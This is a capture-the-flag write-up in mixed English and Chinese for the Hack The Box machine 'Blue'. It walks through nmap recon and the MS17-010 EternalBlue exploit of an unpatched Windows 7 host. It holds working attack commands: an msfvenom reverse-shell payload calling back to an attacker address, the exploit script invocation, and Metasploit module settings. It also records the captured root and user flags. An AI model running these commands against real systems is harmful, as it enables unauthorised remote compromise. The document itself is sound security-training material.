# Blue
- URL : https://app.hackthebox.eu/machines/51
- IP : 10.129.209.90

## Recon
- Rustscan
    - ![](https://i.imgur.com/67XVo54.png)
- nmap
    - `nmap -A -p 135,139,445,49152,49153,49154,49155,49156,49157 10.129.209.90`
        - ![](https://i.imgur.com/KncNQzE.png)
    - 系統版本
        - Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
- smb
    - ![](https://i.imgur.com/n93prMN.png)
    - ![](https://i.imgur.com/B8ABEM7.png)
    - ![](https://i.imgur.com/mZDgLa8.png)
- nmapAutomator
    - ![](https://i.imgur.com/UlMW8lp.png)



## Exploit
- https://github.com/helviojunior/MS17-010
    - 修改 `send_and_execute.py` 裡面的 username
        - 等於 `guest`
- MSF 準備 shell
    - `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.35 LPORT=7877  -f exe -o shellx64.exe`
        - 其實這邊用 x86 也可以
- 執行 Exploit
    - `python send_and_execute.py  10.129.216.62 ../shellx64.exe`
    - ![](https://i.imgur.com/bvmzbcP.png)
- nc 收 shell
    - ![](https://i.imgur.com/QTfgtnr.png)


## MSF Exploit
- `use windows/smb/ms17_010_eternalblue`
- options
    ![](https://i.imgur.com/yLfHcrh.png)
- `set RHOSTS 10.129.216.62`
- `set LHOST 10.10.16.35`
- `run`
    - ![](https://i.imgur.com/MJjRbSk.png)
- Get Root Key
    - `ff548eb71e920ff6c08843ce9df4e717`
    - ![](https://i.imgur.com/xJVAJs4.png)
- Get User Key
    - ![](https://i.imgur.com/VEFkOCN.png)
    - `4c546aea7dbee75cbd71de245c8deea9`